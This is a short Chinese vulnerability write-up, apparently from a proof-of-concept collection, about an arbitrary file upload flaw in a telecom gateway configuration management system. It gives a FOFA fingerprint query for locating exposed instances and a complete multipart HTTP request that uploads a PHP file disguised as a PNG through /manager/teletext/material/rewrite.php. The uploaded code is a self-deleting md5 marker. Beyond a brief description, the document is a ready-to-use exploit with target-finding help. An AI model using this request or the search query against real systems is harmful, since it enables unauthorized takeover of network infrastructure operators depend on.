**fofa**

```
body="img/login_bg3.png" && body="系统登录"
```

**一、漏洞简述**

 电信网关配置管理系统是一个用于管理和配置电信网络中网关设备的软件系统。它可以帮助网络管理员实现对网关设备的远程监控、配置、升级和故障排除等功能，从而确保网络的正常运行和高效性能。其接口/manager/teletext/material/rewrite.php存在任意文件上传漏洞、攻击者可通过该漏洞，获取系统权限。

**二、漏洞检测poc**

```yaml
POST /manager/teletext/material/rewrite.php HTTP/1.1
Host: x.x.x.x
User-Agent: MMozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
Content-Length: 300

------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="tmp_name"; filename="S7ALbg.php"
Content-Type: image/png

<?php echo md5(123456);unlink(__FILE__);?>
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="uploadtime"


------WebKitFormBoundaryOKldnDPT--
```

